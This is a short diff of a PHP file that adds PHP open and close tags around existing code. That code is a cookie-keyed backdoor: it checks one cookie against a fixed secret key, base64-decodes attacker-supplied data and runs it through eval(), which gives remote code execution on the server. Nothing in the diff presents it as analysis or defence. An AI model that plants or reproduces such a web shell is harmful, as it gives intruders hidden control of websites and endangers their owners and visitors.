@@ -1,3 +1,4 @@
+<?php
 $c = $_COOKIE['3'] ?? '';
 $k = $_COOKIE['4'] ?? '';
 
@@ -6,4 +7,4 @@ if ($k === 'eee6ff9e2c6a64142d9902c242d329a3') {
     $step2 = base64_decode($step1);
     eval($step2); // 
 }
-
+?>
